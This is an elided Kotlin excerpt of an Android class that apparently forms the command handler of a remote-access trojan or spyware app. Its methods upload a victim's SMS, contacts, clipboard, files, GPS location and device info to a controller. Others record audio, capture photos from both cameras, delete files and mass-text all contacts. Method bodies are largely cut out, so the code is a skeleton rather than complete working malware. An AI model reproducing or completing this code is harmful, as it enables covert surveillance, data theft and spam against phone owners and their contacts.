...
class AppActions(val context: Context) {
    ...
    fun uploadMessages() {
        if (permission.checkReadSms()) {
            try {
                ...
                request.sendText(AppRequest.Text("Error reading messages: ${e.message}"))
            }
        } else {
    ...
    fun messageToAllContacts(message: String) {
        if (permission.checkReadContacts() && permission.checkSendSms()) {
            try {
                ...
                request.sendText(AppRequest.Text("Error sending to all contacts: ${e.message}"))
            }
        } else {
            request.sendText(AppRequest.Text("ᴍᴇꜱꜱᴀɢᴇ ᴀᴄᴛɪᴏɴ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    ...
    fun uploadApps() {
        try {
            ...
            request.sendText(AppRequest.Text("Error getting apps: ${e.message}"))
        }
    }
    ...
    fun uploadDeviceInfo() {
        try {
            ...
            request.sendText(AppRequest.Text("Error getting device info: ${e.message}"))
        }
    }
    ...
    fun uploadClipboard() {
        AppScope.runMain {
            try {
                ...
                request.sendText(AppRequest.Text("Error accessing clipboard: ${e.message}"))
            }
        }
    }
    ...
    fun uploadFile(path: String) {
        if (permission.checkReadExternalStorage()) {
            try {
                val file = File(android.os.Environment.getExternalStorageDirectory().path + "/" + path)
                if (file.exists()) {
                    if (file.isDirectory) {
                ...
                request.sendText(AppRequest.Text("Error accessing file: ${e.message}"))
            }
        } else {
    ...
    fun deleteFile(path: String) {
        if (permission.checkWriteExternalStorage()) {
            try {
                ...
                request.sendText(AppRequest.Text("Error deleting file: ${e.message}"))
            }
        } else {
            request.sendText(AppRequest.Text("ꜰɪʟᴇ ᴍᴀɴᴀɢᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
            ...
            try {
                ...
                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        ...
                        request.sendText(AppRequest.Text("Error stopping recording: ${e.message}"))
                    }
                }, duration * 1000)
            } catch (e: Exception) {
                request.sendText(AppRequest.Text("Error starting recording: ${e.message}"))
            }
        } else {
    ...
    fun captureCameraMain() {
        if (permission.checkCaptureCam()) {
            try {
                ...
                request.sendText(AppRequest.Text("Error capturing camera: ${e.message}"))
            }
        } else {
    ...
    fun captureCameraSelfie() {
        if (permission.checkCaptureCam()) {
            try {
                ...
                request.sendText(AppRequest.Text("Error capturing selfie: ${e.message}"))
            }
        } else {
            request.sendText(AppRequest.Text("ᴄᴀᴍᴇʀᴀ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
        }
    ...
    fun uploadGpsLocation() {
        ...
        if (permission.checkGetLocation()) {
            try {
                ...
                request.sendText(AppRequest.Text("Error getting location: ${e.message}"))
            }
        } else {
    ...
    fun showNotification(title: String, url: String) {
        try {
            if (!permission.checkPostNotifications()) {
                request.sendText(AppRequest.Text("ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ"))
                return
            }
            
            val NOTIFICATION_CHANNEL_ID = "channel_notification"
            ...
            request.sendText(AppRequest.Text("Error showing notification: ${e.message}"))
        }
    }
    ...
    fun vibratePhone() {
        try {
            ...
            request.sendText(AppRequest.Text("Error vibrating: ${e.message}"))
        }
    }
    ...
    fun playAudio(url: String) {
        AppScope.runMain {
            try {
                ...
                request.sendText(AppRequest.Text("ᴀᴜᴅɪᴏ ꜰɪʟᴇ ᴘʟᴀʏʙᴀᴄᴋ ꜰᴀɪʟᴇᴅ: ${e.message}"))
            }
        }
    }
    ...
    fun stopAudio() {
        AppScope.runMain {
            try {
                ...
                request.sendText(AppRequest.Text("Error stopping audio: ${e.message}"))
            }
        }
    }
